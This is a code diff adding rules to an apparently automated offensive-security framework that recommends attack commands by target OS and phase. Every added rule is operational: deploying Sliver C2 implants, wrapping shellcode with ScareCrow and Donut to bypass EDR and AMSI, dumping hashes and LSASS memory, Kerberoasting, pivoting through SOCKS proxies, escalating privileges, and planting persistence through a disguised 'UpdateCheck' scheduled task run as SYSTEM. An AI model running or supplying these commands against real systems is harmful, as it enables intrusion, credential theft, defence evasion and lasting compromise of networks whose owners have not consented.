@@ -268,6 +268,100 @@ RECOMMENDATION_RULES: List[Dict] = [
                                "curl -X POST http://empire:1337/api/v2/listeners -d '{...}'", 2, "c2"),
         ],
     },
+
+    # === C2_DEPLOY — Sliver implant generation & delivery ===
+    {
+        "name": "c2_deploy_windows",
+        "phase": "C2_DEPLOY",
+        "condition": lambda ctx: ctx.target_os == TargetOS.WINDOWS,
+        "tools": [
+            ToolRecommendation("sliver", "Deploy Sliver C2 implant to Windows target via mTLS session.",
+                               "python3 /opt/tazosploit/scripts/generate_implant.py --os windows --arch amd64 --transport mtls --mode session --json", 1, "c2"),
+            ToolRecommendation("scarecrow", "Wrap Sliver shellcode with ScareCrow for EDR bypass.",
+                               "ScareCrow -I /tmp/donut.bin -Loader dll -domain microsoft.com -sign -encryptionmode AES", 2, "evasion"),
+            ToolRecommendation("donut", "Convert Sliver implant to position-independent shellcode with AMSI/ETW bypass.",
+                               "donut -i /tmp/raw.bin -o /tmp/donut.bin -a 2 -e 3 -z 2 -b 1 -k 1 -j svchost", 3, "evasion"),
+        ],
+    },
+    {
+        "name": "c2_deploy_linux",
+        "phase": "C2_DEPLOY",
+        "condition": lambda ctx: ctx.target_os == TargetOS.LINUX,
+        "tools": [
+            ToolRecommendation("sliver", "Deploy Sliver C2 implant to Linux target via mTLS session.",
+                               "python3 /opt/tazosploit/scripts/generate_implant.py --os linux --arch amd64 --transport mtls --mode session --json", 1, "c2"),
+        ],
+    },
+    {
+        "name": "c2_deploy_generic",
+        "phase": "C2_DEPLOY",
+        "condition": lambda ctx: ctx.target_os == TargetOS.UNKNOWN,
+        "tools": [
+            ToolRecommendation("sliver", "Deploy Sliver C2 implant (detect OS from prior recon first).",
+                               "python3 /opt/tazosploit/scripts/generate_implant.py --os windows --arch amd64 --transport mtls --mode session --json", 1, "c2"),
+        ],
+    },
+
+    # === POST-EXPLOIT with active C2 — Sliver session operations ===
+    {
+        "name": "post_exploit_c2_windows_creds",
+        "phase": "POST_EXPLOIT",
+        "condition": lambda ctx: ctx.has_c2 and ctx.target_os == TargetOS.WINDOWS,
+        "tools": [
+            ToolRecommendation("sliver", "Dump credentials via Sliver session (hashdump/BOFs).",
+                               "python3 /opt/tazosploit/scripts/c2_post_exploit.py --session-id {SESSION_ID} --action hashdump --output-dir /pentest/output --json", 1, "c2"),
+            ToolRecommendation("rubeus", "Kerberoast/AS-REP roast via execute-assembly through Sliver.",
+                               "sliver [session] > execute-assembly /opt/tools/Rubeus.exe -- kerberoast /outfile:hashes.txt", 2, "credential_access"),
+            ToolRecommendation("nanodump", "Dump LSASS memory stealthily via BOF through Sliver.",
+                               "sliver [session] > inline-execute /opt/tools/bofs/nanodump.x64.o --write C:\\Windows\\Temp\\debug.dmp", 3, "credential_access"),
+            ToolRecommendation("sharphound", "Collect BloodHound AD data via execute-assembly through Sliver.",
+                               "sliver [session] > execute-assembly /opt/tools/SharpHound.exe -- -c All", 4, "discovery"),
+        ],
+    },
+    {
+        "name": "post_exploit_c2_linux_creds",
+        "phase": "POST_EXPLOIT",
+        "condition": lambda ctx: ctx.has_c2 and ctx.target_os == TargetOS.LINUX,
+        "tools": [
+            ToolRecommendation("sliver", "Enumerate and extract creds via Sliver session on Linux.",
+                               "python3 /opt/tazosploit/scripts/c2_post_exploit.py --session-id {SESSION_ID} --action enum --output-dir /pentest/output --json", 1, "c2"),
+            ToolRecommendation("linpeas", "Upload and run LinPEAS for privesc enumeration through Sliver.",
+                               "sliver [session] > upload /opt/tools/linpeas.sh /tmp/linpeas.sh && sliver [session] > execute -o 'chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh -a'", 2, "post_exploit"),
+        ],
+    },
+    {
+        "name": "post_exploit_c2_pivot",
+        "phase": "POST_EXPLOIT",
+        "condition": lambda ctx: ctx.has_c2,
+        "tools": [
+            ToolRecommendation("sliver", "Set up SOCKS5 proxy through Sliver session for internal pivoting.",
+                               "sliver [session] > socks5 start --port 1080", 1, "pivoting"),
+            ToolRecommendation("proxychains", "Route tools through Sliver SOCKS proxy to reach internal network.",
+                               "proxychains nmap -sT -Pn -n 10.0.0.0/24 -p 22,80,445,3389 --open", 2, "pivoting"),
+        ],
+    },
+    {
+        "name": "post_exploit_c2_privesc_windows",
+        "phase": "POST_EXPLOIT",
+        "condition": lambda ctx: ctx.has_c2 and ctx.target_os == TargetOS.WINDOWS and not ctx.has_shell,
+        "tools": [
+            ToolRecommendation("sliver", "Attempt privilege escalation via getsystem (named pipe impersonation).",
+                               "sliver [session] > getsystem", 1, "post_exploit"),
+            ToolRecommendation("seatbelt", "Run Seatbelt for comprehensive host enumeration via Sliver.",
+                               "sliver [session] > execute-assembly /opt/tools/Seatbelt.exe -- -group=all", 2, "discovery"),
+        ],
+    },
+    {
+        "name": "post_exploit_c2_persist",
+        "phase": "POST_EXPLOIT",
+        "condition": lambda ctx: ctx.has_c2,
+        "tools": [
+            ToolRecommendation("sliver", "Install persistence via scheduled task through Sliver session.",
+                               "sliver [session] > execute -o 'schtasks /create /tn \"UpdateCheck\" /tr \"C:\\Windows\\Temp\\svc.exe\" /sc onstart /ru SYSTEM /f'", 1, "persistence"),
+            ToolRecommendation("sharppersist", "Install persistence via SharpPersist through Sliver.",
+                               "sliver [session] > execute-assembly /opt/tools/SharpPersist.exe -- -t schtask -c 'C:\\path\\beacon.exe' -n 'UpdateCheck' -m add", 2, "persistence"),
+        ],
+    },
 ]
 
 
